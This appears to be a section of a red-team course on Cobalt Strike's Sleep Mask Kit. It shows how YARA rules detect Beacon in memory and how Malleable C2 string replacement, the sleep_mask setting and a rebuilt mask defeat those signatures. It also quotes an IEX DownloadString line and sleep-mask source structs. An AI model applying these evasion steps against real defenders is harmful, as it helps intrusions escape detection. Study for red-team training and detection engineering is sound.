Cobalt Strike has several capabilities which allow operators to change how the Beacon payload appears in memory.  These are helpful when evading defences such as memory scanners.  One such capability is the Sleep Mask Kit and will be the focus of this section.

> Since Cobalt Strike 4.6, the individual kits have been combined into a single "Arsenal Kit", but I still reference the individual naming schemes.

To demonstrate it, let's start with some basic Beacon shellcode.  Inspecting the relevant regions of a process injected with Beacon shellcode, it's obvious that there's a PE running in memory.  It wouldn't be difficult for a memory scanner to find this and flag it as suspicious.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/sleep-mask/beacon_default.png)


We can demonstrate this using YARA.  Consider the following rule:

```json
rule beacon_strings {

    strings:
        $a = "beacon.x64.dll"
        $b = "ReflectiveLoader"
        $c = "%02d/%02d/%02d %02d:%02d:%02d"
        $d = "%s as %s\\%s: %d"

    condition:
        any of them
}
```

I've picked out some strings that appear in this default Beacon shellcode.

>  `strings beacon.bin` is useful.

The YARA CLI tool can be used to scan running processes and evaluate them against such rules (where 8364 is the PID of Notepad containing Beacon).

```
C:\Tools\YARA>yara64.exe -s beacon_strings.yara 8364
beacon_strings 8364
0x25f179fc8f2:$a: beacon.x64.dll
0x25f179fc901:$b: ReflectiveLoader
0x25f179ed72c:$c: %02d/%02d/%02d %02d:%02d:%02d
0x25f179ed758:$c: %02d/%02d/%02d %02d:%02d:%02d
0x25f179ed700:$d: %s as %s\%s: %d
```  

This output shows that YARA was able to match these strings against the memory region Beacon is living in.  You can also search for strings using Process Hacker and corroborate the results.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/sleep-mask/beacon_x64_dll.png)

  
Malleable C2 has a set of transforms that can be added to the stage block.  One of those is `strrep`, short for string replacement.

```json
stage {
        set userwx "false";
        set cleanup "true";

        transform-x64 {
                strrep "beacon.x64.dll" "data.dll";
                strrep "ReflectiveLoader" "LoadData";
        }
}
```

  

This can replace strings with Beacon's reflective DLL.  If we use this profile and generate new shellcode, YARA flags on fewer strings.

```
C:\Tools\YARA>yara64.exe -s beacon_strings.yara 6368
beacon_strings 6368
0x1a475bfd72c:$c: %02d/%02d/%02d %02d:%02d:%02d
0x1a475bfd758:$c: %02d/%02d/%02d %02d:%02d:%02d
0x1a475bfd700:$d: %s as %s\%s: %d
```

  

---

#### Warning on String Replacement

I've seen people attempt to replace practically every string they can find in the Beacon payload, break functionality, and not understand why.  Take the following example:

```
strrep "HTTP/1.1 200 OK" "";
```

Beacon contains a tiny built-in HTTP server, used in workflows such as `powershell-import`, `powershell` and `powerpick`.  Imported scripts are fetched and executed from this internal webserver.

```shell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-Domain

beacon> powerpick Get-Domain
[+] received output:
ERROR: DownloadString : Exception calling "DownloadString" with "1" argument(s): "The server committed a p
ERROR: rotocol violation. Section=ResponseStatusLine"
ERROR: 
ERROR: At line:1 char:46
ERROR: + IEX (New-Object Net.Webclient).DownloadString <<<< ('http://127.0.0.1:41100/'); Get-Domain
ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : DotNetMethodException
ERROR:  
ERROR: Get-Domain : The term 'Get-Domain' is not recognized as the name of a cmdlet, function, script file
ERROR: , or operable program. Check the spelling of the name, or if a path was included, verify that the p
ERROR: ath is correct and try again.
```

PowerShell throws a _protocol violation_, because Beacon's internal server is no longer returning properly-formatted HTTP responses.  This can be seen in these example Wireshark captures.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/sleep-mask/strrep-fail.png)

  

---

There are more indicators within memory than simple strings, so the Sleep Mask was added as a means of providing more fine-grained control.  This allows Beacon to completely obfuscate its memory whilst sleeping.  Just prior to going to sleep, Beacon walks its own memory sections and XORs them with a random key.  After the sleep has elapsed, it walks back over the same sections and restores them.  It's important to know that Beacon is only obfuscated whilst it's not doing anything.  It must deobfuscate itself to check-in and execute jobs.

To enable the Sleep Mask, add the `sleep_mask` directive into C2 profile, generate new shellcode and inject it.

```
stage {
        set userwx "false";
        set cleanup "true";
        set sleep_mask "true";

        transform-x64 {
                strrep "beacon.x64.dll" "not-beacon.dll";
                strrep "ReflectiveLoader" "LoadData";
        }
}
```

Now when we inspect Beacon's memory, we just see garbage and YARA fails to identify any of the previous strings.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/sleep-mask/beacon_default_sleep_mask.png)


```
C:\Tools\YARA>yara64.exe -s beacon_strings.yara 6016
C:\Tools\YARA>
```

If you set Beacon's sleep time to 0 and run the YARA rules again, you will find instances where either nothing is detected or the previous strings are detected.

```
C:\Tools\YARA>yara64.exe -s beacon_strings.yara 6016
beacon_strings 6016
0x2414166d72c:$c: %02d/%02d/%02d %02d:%02d:%02d
0x2414166d758:$c: %02d/%02d/%02d %02d:%02d:%02d
0x2414166d700:$d: %s as %s\%s: %d
```

This depends on whether you catch Beacon whilst it's asleep or not.  This is why seemingly inferior techniques such as `strrep` are useful in conjunction with `sleep_mask` and why low sleep times can also destroy your OPSEC.

This sleep mask feature has gone through several revisions since it was introduced.  At first memory was XOR'd with a single byte key, now, a 13-byte key is used.  Some clever folk over at Elastic wrote a YARA rule to identify part of the deobfuscation routine.

It looks something like this:

```json
rule beacon_default_sleep_mask {

    strings:
        $a_x64 = {4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03}
        $a_x86 = {8B 46 04 8B 08 8B 50 04 83 C0 08 89 55 08 89 45 0C 85 C9 75 04 85 D2 74 23 3B CA 73 E6 8B 06 8D 3C 08 33 D2}

    condition:
        any of them
}
```

This allows YARA to identify Beacon running in memory even whilst obfuscated.

```
C:\Tools\YARA>yara64.exe -s beacon-default-sleep-mask.yara 6016
beacon_default_sleep_mask 6016
0x24141650d75:$a_x64: 4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03
0x24141650f0d:$a_x64: 4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03
```  

This is where the Sleep Mask Kit comes into play - it allows operators to customise how Beacon obfuscates and deobfuscates itself in memory.

The structure of each kit is quite straight forward.  The top level contains a README, a build script, a template aggressor script, and a source code directory.  The README in particular should be consulted as it outlines several aspects that should be taken into account before modifying the sleep mask.

The source code comes in three files:  `sleepmask.c`, `sleepmask_smb.c` and `sleepmask_tcp.c`.

```
ubuntu@teamserver ~/c/a/k/sleepmask> pwd
/home/ubuntu/cobaltstrike/arsenal-kit/kits/sleepmask
ubuntu@teamserver ~/c/a/k/sleepmask> ll -R
.:
total 16K
-rw-r--r-- 1 ubuntu ubuntu 3.1K Apr 26 20:37 README.md
-rwxr--r-- 1 ubuntu ubuntu 2.4K Apr 26 20:37 build.sh*
-rw-r--r-- 1 ubuntu ubuntu  896 Apr 26 20:37 script_template.cna
drwxrwxr-x 2 ubuntu ubuntu 4.0K Apr 26 20:37 src/

./src:
total 12K
-rw-r--r-- 1 ubuntu ubuntu 2.1K Apr 26 20:37 sleepmask.c
-rw-r--r-- 1 ubuntu ubuntu 3.0K Apr 26 20:37 sleepmask_smb.c
-rw-r--r-- 1 ubuntu ubuntu 2.5K Apr 26 20:37 sleepmask_tcp.c
```

  

Each type of Beacon has its own sleep mask implementation.  Although we're only going to look at `sleepmask.c` (used by the HTTP, HTTPS and DNS Beacons) in this section, the same principal applies to all of them.

Let's review the code.  First, we have two struct definitions called `HEAP_RECORD` and `SLEEPMASKP`.

```c++
/*
 *  ptr  - pointer to the base address of the allocated memory.
 *  size - the number of bytes allocated for the ptr.
 */
typedef struct {
        char * ptr;
        size_t size;
} HEAP_RECORD;

/*
 *  beacon_ptr   - pointer to beacon's base address
 *  sections     - list of memory sections beacon wants to mask.
 *                 A section is denoted by a pair indicating the start and end index locations.
 *                 The list is terminated by the start and end locations of 0 and 0.
 *  heap_records - list of memory addresses on the heap beacon wants to mask. 
 *                 The list is terminated by the HEAP_RECORD.ptr set to NULL. 
 *  mask         - the mask that beacon randomly generated to apply
 */
typedef struct {
        char  * beacon_ptr;
        DWORD * sections;
        HEAP_RECORD * heap_records;
        char    mask[MASK_SIZE];
} SLEEPMASKP;
```

The comments in the source make it easy to understand what each property is for.

Second, we have a method called sleep_mask which brings in a pointer to a `SLEEPMASKP` struct, a pointer to Beacon's sleep function, and the amount of time the Beacon was requested to sleep for.

```c++
void sleep_mask(SLEEPMASKP * parms, void(__stdcall *pSleep)(DWORD), DWORD time)
```

Essentially, prior to sleeping, the sleep mask will walk Beacon's memory sections and heap allocations, and XOR's each byte with a key.  It will then sleep for the specified amount of time.  When it wakes, it walks back over the memory, restoring each byte to its original value, and then returns execution back to Beacon.

The default implementation uses XOR, but you're not limited to this.  You can pretty much do anything you want, as long as the compiled size comes in under 769 bytes.  Most of the time, you don't have to do anything crazy complex - just something that's different from the default to break these static signatures.  Sometimes, you can also just re-compile the existing code without making any changes.  Differences in compilers and library versions etc can produce an output that's sufficiently different to the signature(s).

To build the kit, run `build.sh`. and specify an output directory.

```shell
ubuntu@teamserver ~/c/a/k/sleepmask> sudo ./build.sh /tmp/sleepmask
[Sleepmask kit] [+] You have a x86_64 mingw--I will recompile the sleepmask beacon object files
[Sleepmask kit] [*] Compile sleepmask.x86.o
[Sleepmask kit] [*] Compile sleepmask_tcp.x86.o
[Sleepmask kit] [*] Compile sleepmask_smb.x86.o
[Sleepmask kit] [*] Compile sleepmask.x64.o
[Sleepmask kit] [*] Compile sleepmask_tcp.x64.o
[Sleepmask kit] [*] Compile sleepmask_smb.x64.o
[Sleepmask kit] [+] The sleepmask beacon object files are saved in '/tmp/sleepmask'
ubuntu@teamserver ~/c/a/k/sleepmask> ll /tmp/sleepmask
total 28K
-rw-r--r-- 1 root root 1.1K May 30 09:38 sleepmask.cna
-rw-r--r-- 1 root root  891 May 30 09:38 sleepmask.x64.o
-rw-r--r-- 1 root root  634 May 30 09:38 sleepmask.x86.o
-rw-r--r-- 1 root root 1.1K May 30 09:38 sleepmask_smb.x64.o
-rw-r--r-- 1 root root  846 May 30 09:38 sleepmask_smb.x86.o
-rw-r--r-- 1 root root 1007 May 30 09:38 sleepmask_tcp.x64.o
-rw-r--r-- 1 root root  798 May 30 09:38 sleepmask_tcp.x86.o
```


>  The build scripts run `rm -rf` on the output directory, so don't use something like `/home/ubuntu` (I learned the hard way).

The output will include x64 and x86 builds for each sleep mask variant, and an aggressor script.  Copy the folder to the Windows Attacker VM.

```powershell
C:\Users\Administrator\Desktop>pscp -r -i ssh.ppk ubuntu@10.10.0.69:/tmp/sleepmask C:\Tools\cobaltstrike
sleepmask_tcp.x64.o       | 0 kB |   1.0 kB/s | ETA: 00:00:00 | 100%
sleepmask_smb.x86.o       | 0 kB |   0.8 kB/s | ETA: 00:00:00 | 100%
sleepmask.x64.o           | 0 kB |   0.9 kB/s | ETA: 00:00:00 | 100%
sleepmask.x86.o           | 0 kB |   0.6 kB/s | ETA: 00:00:00 | 100%
sleepmask.cna             | 1 kB |   1.1 kB/s | ETA: 00:00:00 | 100%
sleepmask_smb.x64.o       | 1 kB |   1.0 kB/s | ETA: 00:00:00 | 100%
sleepmask_tcp.x86.o       | 0 kB |   0.8 kB/s | ETA: 00:00:00 | 100%
```

Go to **Cobalt Strike > Script Manager**, click **Load** and select `sleepmask.cna`.  To test the mask, generate and execute a new Beacon payload.

>  Already running Beacons will not have this new mask applied to them, only new Beacons.

  

The YARA rule for the default sleep mask no longer detects Beacon.

```js
C:\Tools\YARA>yara64.exe -s beacon-default-sleep-mask.yara 2248
C:\Tools\YARA>
```